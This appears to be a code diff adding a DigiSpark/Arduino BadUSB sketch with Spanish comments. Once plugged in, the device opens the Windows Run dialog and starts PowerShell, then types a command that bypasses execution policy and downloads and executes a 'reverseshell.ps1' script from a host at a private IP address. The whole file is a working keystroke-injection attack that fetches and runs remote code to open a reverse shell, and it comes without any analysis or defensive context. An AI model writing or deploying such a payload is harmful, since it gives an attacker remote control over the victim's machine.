@@ -1,0 +1,29 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(0); // Asegúrate de que la ventana esté activa
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+
+  // Escribe la primera parte del comando
+  DigiKeyboard.print("powershell -NoP -NonI -Exec Bypass -Command \"& {IEX (New-Object Net.WebClient).DownloadString('");
+
+  // Espera 500 milisegundos (0.5 segundos)
+  DigiKeyboard.delay(500); // Ajusta este tiempo si es necesario
+
+  // Escribe la segunda parte del comando (URL)
+  DigiKeyboard.print("http://192.168.56.101:8080/reverseshell.ps1");
+  
+  // Cierra la cadena y envía el comando
+  DigiKeyboard.print("')}\""); // Agrega la comilla doble al final
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Ejecuta el comando
+}
+
+void loop(){
+
+}
